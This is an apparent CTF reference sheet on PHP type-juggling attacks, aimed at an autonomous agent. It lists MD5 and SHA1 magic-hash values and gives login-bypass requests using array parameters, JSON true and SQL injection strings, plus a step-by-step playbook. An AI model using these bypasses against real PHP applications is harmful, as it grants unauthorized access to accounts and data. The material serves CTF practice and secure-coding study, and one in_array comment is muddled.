# PHP Type Juggling - CTF Reference

> **Document Purpose:** Actionable PHP type juggling techniques for CTF challenges. Covers loose comparison exploits, magic hashes, and function-specific bypass methods for autonomous agent retrieval.

---

## 1. Loose Comparison vs Strict Comparison

> **When to use this section:** You suspect a PHP application uses `==` instead of `===` for security-critical comparisons.

**Tags:** `php, type-juggling, loose-comparison, strict-comparison`

**Loose Comparison (`==`):** Performs type coercion before comparing.
```php
"0" == false    // true
"" == false     // true
"0" == null     // false (PHP 8: false; PHP 7: false)
0 == "any"      // true in PHP 7! (PHP 8: false)
"0e1" == "0e2"  // true (both are 0 in scientific notation)
"1" == "01"     // true
"1" == "1.0"    // true
[] == false     // true
"php" == 0      // true in PHP 7! (PHP 8: false)
```

**Strict Comparison (`===`):** No type coercion, checks type AND value.
```php
"0" === false   // false
"0" === 0       // false
0 === false     // false
"1" === 1       // false
```

**Key Difference:**
```php
// Vulnerable code (loose comparison)
if ($user_input == $secret_token) { grant_access(); }

// Secure code (strict comparison)
if ($user_input === $secret_token) { grant_access(); }
```

---

## 2. Magic Hashes

> **When to use this section:** The application compares user input's hash against a stored hash using `==`.

### 2.1 MD5 Magic Hashes

**Tags:** `php, magic-hash, md5, type-juggling, authentication-bypass`

**Concept:** If a hash starts with `0e` followed by only digits, PHP interprets it as scientific notation (0 * 10^N = 0). Two such hashes compared with `==` are both equal to 0.

**MD5 Magic Hash Values (hash starts with `0e[0-9]+`):**
```
String              MD5 Hash
240610708           0e462097431906509019562988736854
QNKCDZO            0e830400451993494058024219903391
aabg7XSs            0e087386482136013740957780965295
s878926199a         0e545993274517709034328855841020
s155964671a         0e342768416822451524974117254469
s214587387a         0e848240448830537924465865611904
s1091221200a        0e940624217856561557816327384675
```

**Exploitation:**
```php
// Vulnerable code
if (md5($user_input) == "0e462097431906509019562988736854") {
    // Send "240610708" - its MD5 also starts with 0e...
    // Both evaluate to 0, comparison passes
}

// Or compare two user inputs
if (md5($input1) == md5($input2)) {
    // Send input1=QNKCDZO and input2=240610708
    // Both MD5s start with 0e, both == 0
}
```

### 2.2 SHA1 Magic Hashes

**Tags:** `php, magic-hash, sha1, type-juggling`

**SHA1 Magic Hash Values:**
```
String          SHA1 Hash
aaroZmOk        0e66507019969427134894567494305185566735
aaK1STfY        0e76658526655756207688271159624026011393
10932435112     0e07766915004133176347055865026311692244
```

### 2.3 Using Magic Hashes in CTFs

**Tags:** `php, magic-hash, ctf, login-bypass`

**Login Bypass Pattern:**
```
POST /login
username=admin&password=240610708

If server does: md5($password) == $stored_hash
And stored_hash starts with 0e...
Then 0 == 0 is true, login succeeds
```

**Hash Comparison Bypass:**
```
POST /verify
token=QNKCDZO

If server does: md5($token) == md5($secret)
And md5($secret) starts with 0e...
Then both are 0, comparison passes
```

---

## 3. strcmp() Bypass with Arrays

> **When to use this section:** The application uses `strcmp()` for password or token comparison.

**Tags:** `php, strcmp, array-bypass, type-juggling, authentication-bypass`

**Vulnerability:** `strcmp()` returns `NULL` (not 0) when given an array instead of a string. In loose comparison, `NULL == 0` is `true`.

```php
// Vulnerable code
if (strcmp($password, $correct_password) == 0) {
    grant_access();  // Intended: strings are equal
}

// Exploit: send password as array
// POST: password[]=anything
// strcmp(array, string) returns NULL
// NULL == 0 is true in PHP!
```

**HTTP Request:**
```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password[]=anything
```

**JSON Variant:**
```json
{"username": "admin", "password": []}
```

---

## 4. is_numeric() Bypass

> **When to use this section:** Input validation uses `is_numeric()` but later comparison is loose.

**Tags:** `php, is_numeric, bypass, type-juggling`

**Key Insight:** `is_numeric()` accepts hex strings in PHP 5 and scientific notation in all versions.

```php
// PHP 5: is_numeric("0x1A") returns true
// All PHP: is_numeric("0e1234") returns true
// All PHP: is_numeric("1.2e3") returns true

// Exploitation
is_numeric("0e12345") // true - passes validation
"0e12345" == 0        // true - type juggling in comparison
```

---

## 5. intval() Truncation

> **When to use this section:** The application uses `intval()` to convert input before comparison.

**Tags:** `php, intval, truncation, type-juggling, bypass`

**Behavior:** `intval()` stops parsing at the first non-numeric character.

```php
intval("1234abcd")  // 1234
intval("0x1A")      // 0 (PHP 7+) or 26 (PHP 5)
intval("0e12345")   // 0
intval("1 OR 1=1")  // 1
intval("0123")      // 83 (octal) or 123 depending on base

// Exploitation: bypass numeric checks
if (intval($input) == 1) {       // Send "1 UNION SELECT..."
    $result = query($input);      // SQLi passes through
}
```

---

## 6. json_decode Type Confusion

> **When to use this section:** Application accepts JSON input and uses loose comparison on decoded values.

**Tags:** `php, json, type-confusion, type-juggling, bypass`

**Key Insight:** `json_decode` produces native PHP types, enabling type juggling.

```php
$data = json_decode('{"password": true}');
// $data->password is boolean true

if ($data->password == "any_string") {
    // true == "any_string" is TRUE in PHP!
    grant_access();
}

// Exploit payloads
{"password": true}      // true == "secret123" is true
{"password": 0}         // 0 == "secret123" is true (PHP 7)
{"password": []}        // for strcmp bypass
{"admin": true}         // for boolean flag checks
```

---

## 7. in_array() Loose Comparison

> **When to use this section:** Application uses `in_array()` without strict mode for access control or validation.

**Tags:** `php, in_array, loose-comparison, type-juggling`

**Vulnerability:** `in_array()` uses loose comparison by default (3rd parameter `strict` defaults to `false`).

```php
$allowed = [1, 2, 3, 4, 5];

in_array("1 UNION SELECT", $allowed);  // true! ("1 UNION..." loosely equals 1)
in_array("2' OR '1'='1", $allowed);    // true! (loosely equals 2)
in_array(true, $allowed);              // true!
in_array("0e1234", $allowed);          // false (not in array, but 0 is not in array)
```

---

## 8. PHP 7 vs PHP 8 Behavioral Differences

> **When to use this section:** You need to know which tricks work on which PHP version.

**Tags:** `php, version-differences, php7, php8, type-juggling`

**PHP 8 Breaking Changes (Stricter Comparisons):**
```php
// PHP 7: 0 == "foo" is TRUE  |  PHP 8: 0 == "foo" is FALSE
// PHP 7: 0 == ""   is TRUE   |  PHP 8: 0 == ""   is FALSE
// PHP 7: "" == null is TRUE   |  PHP 8: "" == null is TRUE (unchanged)

// Still works in PHP 8:
"0e123" == "0e456"  // TRUE (both are 0 in scientific notation)
true == "anything"  // TRUE
[] == false         // TRUE
```

**Version Detection:**
- Check HTTP headers for `X-Powered-By: PHP/X.X`
- Trigger errors to see PHP version in stack traces
- Test `0 == "string"`: if true, PHP 7; if false, PHP 8

---

## 9. Common CTF Patterns

> **When to use this section:** Solving PHP type juggling challenges in CTF competitions.

**Tags:** `php, ctf, patterns, login-bypass, type-juggling`

**Pattern 1: Login Bypass with Magic Hash**
```
Challenge: "Log in as admin"
Code: if (md5($password) == $stored_hash)
Solution: Try magic hash values (240610708, QNKCDZO)
```

**Pattern 2: Admin Check with Type Juggling**
```
Challenge: JSON API with role check
Code: if ($data['role'] == 1)
Solution: Send {"role": true} (true == 1 is true)
```

**Pattern 3: Token Comparison Bypass**
```
Challenge: "Verify your token"
Code: if ($_GET['token'] == $secret_token)
Solution: If secret starts with 0e, send any 0e magic hash
```

**Pattern 4: strcmp Password Bypass**
```
Challenge: Login form
Code: if (strcmp($pass, $correct) == 0)
Solution: Send password[]=x (array causes NULL == 0)
```

**CTF Playbook:**
1. Identify PHP (headers, file extensions, error messages)
2. Check if comparisons use `==` or `===`
3. Try JSON payloads with `true`, `0`, `[]` for type confusion
4. Try array parameters (`param[]=x`) for strcmp bypass
5. Try magic hashes for hash comparison bypass
6. Check PHP version to know which tricks apply

---

## 10. Agent Takeaway

> - Use `php_type_juggling` tool with `magic_hashes` mode for MD5/SHA1 comparison bypasses
> - Use `php_type_juggling` tool with `strcmp_bypass` mode for strcmp-based authentication
> - Magic hashes (0e...) only work when both sides of `==` evaluate to scientific notation zero
> - JSON `true` bypasses any loose string comparison in all PHP versions
> - Array parameters (`param[]=x`) break `strcmp()`, returning NULL which equals 0 loosely
> - PHP 8 fixed `0 == "string"` being true, but `0e` magic hashes and `true ==` tricks still work
> - Always check PHP version first to determine which type juggling techniques are viable
